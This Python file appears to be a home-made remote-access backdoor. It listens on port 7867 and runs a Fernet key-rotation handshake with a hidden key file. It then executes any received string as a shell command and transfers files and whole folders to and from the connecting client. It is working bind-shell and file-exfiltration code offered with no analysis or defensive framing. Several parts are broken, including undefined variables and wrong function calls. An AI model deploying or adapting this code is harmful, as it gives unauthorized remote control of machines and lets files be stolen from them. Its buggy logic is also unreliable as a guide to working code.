from cryptography.fernet import Fernet
from hashlib import sha256
import subprocess,sys,os,socket

file_path_to_read_and_write = os.path.abspath(".0903e3ddsda334d3.dasd234342.;sfaf'afafaf[a]]fasd.one")
def create_socket(port_no):
    try:
        host = socket.gethostbyname(socket.gethostname())
        print("host name:",host)
        s=socket.socket()
        s.bind((host, port_no))
        s.listen(2)
        return s
    except socket.error as msg:
        del s
        create_socket(port_no)

def data_loader():
    arr = []
    file = open(file_path_to_read_and_write,"r")
    for i in file.readlines():
        i = i.replace("\n","")
        if i=="\n":
            pass
        else:
            arr.append(i)
    file.close()
    del file
    print("data loader ", arr)
    return arr[0],arr[1]

def literal_eval(array): 
   return array[1:][:-1].split(',')

def secure_acceptor(s):
    def validate_socket(conn, address,s):
        print("post verification")
        client_token = conn.recv(10000)
        print("password received ",client_token)
        previous_password,current_password = data_loader()
        print(previous_password,current_password)
        new_encrypter = Fernet(current_password.encode())
        prev_encrypter = Fernet(previous_password.encode())
        decrypted_msg = new_encrypter.decrypt(client_token).decode()
        if decrypted_msg == sha256(previous_password.encode()).hexdigest():
            conn.send(prev_encrypter.encrypt((sha256(current_password.encode()).hexdigest()).encode()))
            print("password sent")
            del new_encrypter,prev_encrypter
            return True
        else:
            conn.close()
            del s
            s = create_socket(7867)
            socket_accept(s)
            return False
        

    def socket_accept(s):
        print('entered socket_accept')
        while True:
           # try:
                conn, address = s.accept()
                validataion_s = validate_socket(conn,address,s)
                if  validataion_s == True:
                    print("accepted socket")
                    data_processing(conn,address,s)
                    break
                else:
                    print("socket error validataion failed")
                    pass
            #except Exception as msg:
             #   print(msg)
             #   pass
    socket_accept(s)

def key_changer(previous_passwords,current_passwords):
    
            file=open(file_path_to_read_and_write,"w")
            file.write(previous_passwords)
            file.write("\n")
            file.write(current_passwords)
            file.close()
            del file


def data_processing(conn,address,s):
    previous_password,current_password = data_loader()

    def sender(conn,data):
        def cur_pass_pre_en():
                previous_password,current_password = data_loader()
                key = Fernet(previous_password)
                current_password = sha256(current_password.encode()).hexdigest()
                data = key.encrypt(current_password.encode())
                del key
                return data

        def new_pass_pre_en():
            previous_password,current_password = data_loader()
            key = Fernet(previous_password)
            new_key = Fernet.generate_key()
            data = key.encrypt(new_key)
            del key
            return data,new_key
        
        
        def sender_head(data):
            previous_password,current_password = data_loader()
            en_key,new_key = new_pass_pre_en()
            da_encry = Fernet(new_key)
            en_con = da_encry.encrypt(data.encode())
            sign = cur_pass_pre_en()
            new_key = new_key.decode()
            key_changer(current_password,new_key)
            data_cap = f"{sign.decode()},{en_key.decode()},{en_con.decode()}"
            data_cap_encrp = Fernet(current_password.encode())
            data_cap_en = data_cap_encrp.encrypt(data_cap.encode())
            conn.send(data_cap_encrp.encrypt(str(sys.getsizeof(str(data_cap_en))).encode()))
            print("data_send_en",data_cap_en)
            del data_cap_encrp,da_encry
            conn.send(data_cap_en)
            
        sender_head(data)
    def receiver(conn):
        def receiver_head():
            data = conn.recv(5000)
            previous_password,current_password = data_loader()
            data_k = Fernet(current_password)
            print('data length')
            data_length = int(data_k.decrypt(data).decode())
            return receiver_data(conn,data_length)
            del data_dec                
            
        def receiver_data(conn,data_length):
            data = str(conn.recv(data_length),"utf-8")
            print("data ",data)
            previous_password,current_password = data_loader()
            new_encrypter = Fernet(current_password)
            data = new_encrypter.decrypt(data.encode()).decode()
            data = data.split(",")
            key = Fernet(previous_password)
            
            if key.decrypt(data[0].encode()).decode() == sha256(current_password.encode()).hexdigest():
                del new_encrypter,key
                keys = Fernet(previous_password)
                new_key = keys.decrypt(data[1].encode()).decode()
                del keys
                key_changer(current_password,new_key)
                data_dec = Fernet(new_key)
                datas = data_dec.decrypt(data[2].encode())
                del data_dec               
                return datas 
            else:
                conn.close()
                del s20482048
                s = create_socket(7867)
                socket_accept(s)
        return receiver_head()
    def read_file(file_name):
        arr = []
        file = open(file_name,"r")
        for i in file.readlines():
            arr.append(i)
        file.close()
        del file
        return arr
    def write_file(file_name,data):
        file = open(file_name,"wb")
        file_data = literal_eval(data)
        for i in file_data:
            file.write(i)
        file.close()
        del file
    while True:
        data = receiver(conn).decode()
        print("data ", data)
        if data == "filetransferfromus789789":
            file_name = receiver(conn)
            write_file(file_name)
            sender(conn, f"{file_name} sent")           
                
        if data == "ficonletransferfromu78349789":
            file_name = receiver(conn)
            arra = read_file(file_name)
            sender(conn, str(arra))
        if data == "foldertransferfromu24394039":
            folder_path = receiver(conn)
            dir_a = []
            file_name_a = []
            file_data_a = []
            for root,dirs,files in os.walk(folder_path):
                for dir in dirs:
                    dir_a.append(os.path.join(root, name))
            sender(conn,str(dir_a))
            confirmation = receiver(conn)
            if confirmation == "done":
                for root,dirs,files in os.walk(folder_path):
                    for name in files:
                        file_name = os.path.join(root,name)
                        file_name_a.append(file_name)
                        file_data = read_file(file_name)
                        file_data_a.append(file_data)
            sender(conn, str(file_name_a))
            sender(conn,str(file_data_a))
                        
        if data == "foldertransferfromus24394039":
            dir_list = literal_eval(receiver(conn))
            for i in dir_list:
                os.mkdir(i)
            sender(conn,"done")
            con = True
            while con:
                file_names = literal_eval(receiver(conn))
                file_datas = literal_eval(receiver(conn))
                for i in file_names:
                    write_file(i,file_datas[i])
        
        if data[:2] == 'cd':
            os.chdir(data[3:])        

        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            currentWD = output_byte.decode() + os.getcwd() + "> "
            sender(conn,currentWD)

while True:
    try:
        s=create_socket(7867)
        print("created socket")
        secure_acceptor(s)
    except Exception as msg:
        s=create_socket(7867)
        print("created socket")
        secure_acceptor(s)